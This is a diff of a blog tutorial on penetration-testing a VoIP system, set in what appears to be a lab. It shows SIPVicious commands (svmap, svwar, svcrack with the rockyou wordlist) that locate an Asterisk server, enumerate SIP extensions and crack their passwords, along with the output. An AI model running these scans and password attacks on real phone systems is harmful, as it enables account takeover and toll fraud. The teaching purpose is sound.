@@ -37,12 +37,14 @@ Like any penetration testing process, all we need to do is to follow the general
 
 We will use the sip scanner `svmap` that is part of SIPVicious toolkit used to audit SIP based VoIP systems and of course we can use nmap for ip range scanning.
 
-```console
+
+{% highlight console %}
 psycor@leetspeek:~$ svmap 192.168.43.0/24
 | SIP Device          | User Agent                        | Fingerprint |
 -------------------------------------------------------------------------
 | 192.168.43.173:5060 | Asterisk PBX 1.6.0.26-FONCORE-r78 | disabled    |
-```
+{% endhighlight %}
+
 
 The svmap shows that the ip address 192.168.43.173 is a VoIP server so let’s try to gather more information and enumerate some valid extensions.
 
@@ -55,14 +57,15 @@ Before enumerate valid SIP extensions let’s create two extensions for test usi
 
 Now let’s run `svwar` against our SIP device that is also part of SIPVicious toolkit to help us identifying working extension lines.
 
-```console
+{% highlight console %}
 psycor@leetspeek:~$ svwar -D -m INVITE 192.168.43.173 -e 100-500
 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
 | Extension | Authentication |
 ------------------------------
 | 102       | reqauth        |
 | 101       | reqauth        |
-```
+{% endhighlight %}
+
 As you can see we have two valid extensions are returned that require authentication.
 
 The invite method is one of the SIP Requests asks a server to establish a session, the INVITE request brings back valid responses. 
@@ -71,22 +74,20 @@ The -D option used to scan for default / typical extensions , it’s generally b
 
 Now that we have located valid extensions we need to crack their associated passwords. In order to perform this action we can use `svcrack` (a password cracker for SIP accounts) with password list (rockyou for instance).
 
-```console
+{% highlight console %}
 psycor@leetspeek:~$ svcrack -u101 -d /usr/share/wordlists/rockyou.txt 192.168.43.173
 ERROR:ASipOfRedWine:We got an unknown response
 | Extension | Password |
 ------------------------
 | 101       | iloveyou |
-```
 
-
-```console
 psycor@leetspeek:~$ svcrack -u102 -d /usr/share/wordlists/rockyou.txt 192.168.43.173
 ERROR:ASipOfRedWine:We got an unknown response
 | Extension | Password |
 ------------------------
 | 102       | 123456   |
-```
+{% endhighlight %}
+
 Ok, Cool! we found two passwords but one cracked extension is enough to proceed for the next part ;)
 
   
